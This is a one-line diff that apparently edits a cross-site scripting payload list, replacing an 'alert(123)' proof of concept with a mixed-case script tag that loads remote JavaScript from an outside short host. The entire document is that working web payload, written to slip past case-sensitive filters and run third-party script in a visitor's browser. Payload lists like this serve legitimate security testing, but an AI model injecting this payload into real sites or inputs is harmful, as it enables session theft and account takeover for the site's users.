@@ -1,1 +1,1 @@
-alert(123)
+<sCRiPt sRC=//uj.ci/0n></sCrIpT>
